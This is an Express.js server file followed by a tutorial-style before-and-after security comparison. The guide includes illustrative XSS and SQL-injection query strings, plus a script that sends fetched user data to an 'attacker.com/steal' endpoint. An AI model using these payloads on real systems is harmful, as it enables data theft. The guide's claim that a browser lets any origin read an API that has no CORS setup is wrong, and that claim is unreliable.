// Secure version of the application with best practices implemented

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { query, validationResult } = require('express-validator');
const winston = require('winston');

const app = express();

// Configure logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ],
});

if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.simple(),
  }));
}

// Security middleware - Helmet for HTTP headers
app.use(helmet());

// CORS configuration - whitelist trusted origins
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

// Rate limiting to prevent DoS attacks
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

app.use(limiter);

// Body parsing middleware
app.use(express.json({ limit: '10kb' })); // Limit payload size
app.use(express.urlencoded({ limit: '10kb', extended: false }));

// Request logging middleware
app.use((req, res, next) => {
  logger.info({
    method: req.method,
    path: req.path,
    ip: req.ip,
    timestamp: new Date().toISOString(),
  });
  next();
});

// Health check endpoint
app.get('/health', (req, res) => {
  try {
    res.json({ 
      status: 'ok', 
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
    });
  } catch (error) {
    logger.error('Health check error:', error);
    res.status(500).json({ status: 'error' });
  }
});

// Users endpoint with input validation
app.get('/users',
  query('limit').optional().isInt({ min: 1, max: 100 }).toInt(),
  query('offset').optional().isInt({ min: 0 }).toInt(),
  (req, res) => {
    try {
      // Validate input
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        logger.warn('Validation errors:', errors.array());
        return res.status(400).json({ errors: errors.array() });
      }

      const limit = req.query.limit || 10;
      const offset = req.query.offset || 0;

      // Mock data
      const users = [
        { id: 1, name: 'Alice', email: 'alice@example.com' },
        { id: 2, name: 'Bob', email: 'bob@example.com' },
      ];

      res.json({
        data: users.slice(offset, offset + limit),
        total: users.length,
        limit,
        offset,
      });
    } catch (error) {
      logger.error('Users endpoint error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
);

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Global error handler
app.use((err, req, res, next) => {
  logger.error('Unhandled error:', {
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
  });

  // Don't expose error details in production
  const isDevelopment = process.env.NODE_ENV !== 'production';
  const message = isDevelopment ? err.message : 'Internal server error';

  res.status(err.status || 500).json({ 
    error: message,
    ...(isDevelopment && { stack: err.stack }),
  });
});

// Start server
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

const server = app.listen(PORT, () => {
  logger.info(`Server running on port ${PORT} in ${NODE_ENV} mode`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  logger.info('SIGTERM signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

module.exports = app;

# Before & After Security Comparison

## 1. HTTP Security Headers

### ❌ BEFORE (Vulnerable)
```javascript
const express = require('express');
const app = express();

// No security headers at all!
app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});
```

**Response Headers:**
```
HTTP/1.1 200 OK
Content-Type: application/json
Connection: keep-alive
```

**Vulnerabilities Exposed:**
- ❌ No Content-Security-Policy
- ❌ No X-Frame-Options (Clickjacking possible)
- ❌ No X-Content-Type-Options (MIME sniffing possible)
- ❌ No Strict-Transport-Security (No HTTPS enforcement)

---

### ✅ AFTER (Secure)
```javascript
const helmet = require('helmet');
app.use(helmet());

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});
```

**Response Headers:**
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15768000; includeSubDomains
X-XSS-Protection: 0
Referrer-Policy: no-referrer
```

**Protections Added:**
- ✅ CSP blocks injection attacks
- ✅ Clickjacking prevention
- ✅ MIME-sniffing prevention
- ✅ HTTPS enforcement
- ✅ XSS protection

---

## 2. Rate Limiting

### ❌ BEFORE (DoS Vulnerable)
```javascript
app.get('/users', (req, res) => {
  // Anyone can spam unlimited requests
  res.json([...]);
});
```

**Scenario: Attack**
```
Attacker sends 10,000 requests/second
Server crashes or becomes unresponsive
Legitimate users get no service
```

---

### ✅ AFTER (Protected)
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});

app.use(limiter);

app.get('/users', (req, res) => {
  res.json([...]);
});
```

**Scenario: Same Attack**
```
Attacker sends 10,000 requests/second
After 100 requests: 429 Too Many Requests
Attacker blocked for 15 minutes
Service remains available to others
```

---

## 3. Input Validation

### ❌ BEFORE (Injection Vulnerable)
```javascript
app.get('/users', (req, res) => {
  // No validation!
  const limit = req.query.limit;
  const offset = req.query.offset;

  // Vulnerable to:
  // ?limit=<script>alert(1)</script>
  // ?limit=${malicious code}
  // ?offset=-1 UNION SELECT ...

  res.json([...]);
});
```

**Possible Attacks:**
```
/users?limit=<script>alert('XSS')</script>
/users?limit=-1
/users?limit=9999999 (memory exhaustion)
/users?offset=-1 UNION SELECT password FROM users
```

---

### ✅ AFTER (Protected)
```javascript
const { query, validationResult } = require('express-validator');

app.get('/users',
  query('limit')
    .optional()
    .isInt({ min: 1, max: 100 })
    .toInt(),
  query('offset')
    .optional()
    .isInt({ min: 0 })
    .toInt(),
  (req, res) => {
    // Validation errors caught
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // Safe values only
    const limit = req.query.limit || 10;
    const offset = req.query.offset || 0;

    res.json([...]);
  }
);
```

**Attack Results:**
```
/users?limit=<script>alert('XSS')</script>
Response: 400 Bad Request (injection blocked)

/users?limit=9999999
Response: 400 Bad Request (exceeds max of 100)

/users?offset=-1
Response: 400 Bad Request (must be >= 0)

/users?limit=10&offset=0
Response: 200 OK (valid request processed)
```

---

## 4. Error Handling

### ❌ BEFORE (Information Disclosure)
```javascript
app.get('/users', (req, res) => {
  try {
    // Some operation that fails
    throw new Error('Database connection failed at /var/app/db.js:42');
  } catch (error) {
    // Stack trace exposed!
    res.status(500).json({ error: error.message, stack: error.stack });
  }
});
```

**Response Exposes:**
```json
{
  "error": "Database connection failed at /var/app/db.js:42",
  "stack": "Error: Database connection...\n    at /var/app/db.js:42:15"
}
```

**Information Leaked:**
- File paths reveal system structure
- Stack traces show code flow
- Attackers learn about infrastructure
- Debugging information aids exploitation

---

### ✅ AFTER (Secure)
```javascript
const logger = require('./logger');

app.get('/users', (req, res) => {
  try {
    // Some operation that fails
    throw new Error('Database connection failed');
  } catch (error) {
    // Log details internally
    logger.error('Database error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date()
    });

    // Return generic message to client
    const isDev = process.env.NODE_ENV !== 'production';
    res.status(500).json({
      error: isDev ? error.message : 'Internal server error'
    });
  }
});

// Global error handler
app.use((err, req, res, next) => {
  logger.error('Unhandled error:', err);
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Internal server error'
      : err.message
  });
});
```

**Production Response:**
```json
{
  "error": "Internal server error"
}
```

**Development Response (debug only):**
```json
{
  "error": "Database connection failed"
}
```

**Benefits:**
- ✅ No sensitive information exposed
- ✅ Detailed logs available internally
- ✅ Attackers learn nothing useful
- ✅ Debugging still possible in dev

---

## 5. CORS Configuration

### ❌ BEFORE (Open to Any Origin)
```javascript
// No CORS configuration
// Browser default: allow any origin
app.get('/users', (req, res) => {
  res.json([...]);
});
```

**Attack Scenario:**
```
attacker.com loads:
<script>
  fetch('https://yourapi.com/users')
    .then(r => r.json())
    .then(users => {
      // Send users data to attacker
      fetch('https://attacker.com/steal?data=' + JSON.stringify(users))
    })
</script>
```

**Result:** Users data stolen from legitimate users' browsers

---

### ✅ AFTER (Restricted Origins)
```javascript
const cors = require('cors');

app.use(cors({
  origin: ['https://trusted-domain.com', 'https://app.trusted-domain.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.get('/users', (req, res) => {
  res.json([...]);
});
```

**Attack Scenario Result:**
```
Request from attacker.com:
Browser blocks: "No 'Access-Control-Allow-Origin' header"
Data NOT sent to attacker
Users protected
```

**Allowed:**
- ✅ Requests from trusted-domain.com
- ✅ Requests from app.trusted-domain.com

**Blocked:**
- ❌ Requests from attacker.com
- ❌ Requests from unknown.com

---

## 6. Credentials Management

### ❌ BEFORE (Exposed Secrets)
```
.env.test:
DATABASE_URL=postgres://admin:CANARY-db-secret-7f3a@db.internal:5432/production
AWS_ACCESS_KEY_ID=AKIACANARY1234567890
AWS_SECRET_ACCESS_KEY=CANARY-aws-secret-key-9d2b4e6f8a0c
STRIPE_SECRET_KEY=sk_live_CANARY-stripe-key-2m4n6p8q
```

**In Git Repository:**
```
✓ Anyone with repo access sees all credentials
✓ Credentials stored in git history forever
✓ CI/CD logs may expose them
✓ Backups contain secrets
```

---

### ✅ AFTER (Secure Management)
```
.env (local only, not in git):
DATABASE_URL=postgres://admin:random-12345-strong-password@db.internal:5432/production
VAULT_ADDR=https://vault.company.com
VAULT_TOKEN=s.xxxxxxxxxxxxxxxx
```

```
.env.example (safe template in git):
DATABASE_URL=postgres://user:password@host:5432/dbname
VAULT_ADDR=https://vault.company.com
VAULT_TOKEN=your-vault-token
```

```
.gitignore (prevents leaks):
.env
.env.local
.env.*.local
```

**Runtime Secret Retrieval:**
```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret(name) {
  const data = await secretsManager.getSecretValue({ SecretId: name }).promise();
  return JSON.parse(data.SecretString);
}

// Secrets loaded at runtime, never in source
const dbUrl = await getSecret('prod/database-url');
```

**Benefits:**
- ✅ Secrets never in version control
- ✅ Centralized credential management
- ✅ Easy rotation without code changes
- ✅ Audit trail of access
- ✅ Different secrets per environment

---

## 7. Logging & Monitoring

### ❌ BEFORE (No Visibility)
```javascript
app.get('/users', (req, res) => {
  res.json([...]);
  // No logging!
});

// console.log output (lost on restart)
// No structure, hard to search
// No timestamps
// No context about requests
```

**Attack Scenario:**
```
Attacker runs 10,000 requests to find admin account
Then deletes their logs to cover tracks
You have NO way to know it happened
```

---

### ✅ AFTER (Full Audit Trail)
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ]
});

app.use((req, res, next) => {
  logger.info({
    method: req.method,
    path: req.path,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString()
  });
  next();
});

app.get('/users', (req, res) => {
  logger.info({ event: 'users_requested', ip: req.ip });
  res.json([...]);
});
```

**Structured Logs (combined.log):**
```json
{"method":"GET","path":"/users","ip":"192.168.1.100","timestamp":"2024-01-15T10:30:00Z"}
{"method":"GET","path":"/users","ip":"203.0.113.45","timestamp":"2024-01-15T10:30:01Z"}
{"method":"GET","path":"/users","ip":"203.0.113.45","timestamp":"2024-01-15T10:30:02Z"}
...repeated 9997 times from same IP...
```

**Detection:**
```bash
# Query logs for suspicious activity
grep "203.0.113.45" combined.log | wc -l
# Output: 9999

# Find attacker's requests
grep "203.0.113.45" combined.log > attacker_logs.txt

# Investigate and respond to breach
```

**Benefits:**
- ✅ Detailed audit trail of all requests
- ✅ Detects and investigates attacks
- ✅ Compliance with regulations (PCI, HIPAA, etc.)
- ✅ Performance monitoring
- ✅ Debugging and troubleshooting

---

## Summary Comparison Table

| Feature | Before | After | Impact |
|---------|--------|-------|--------|
| Security Headers | ❌ None | ✅ All | Prevents multiple attack vectors |
| Rate Limiting | ❌ None | ✅ 100/15min | Prevents DoS |
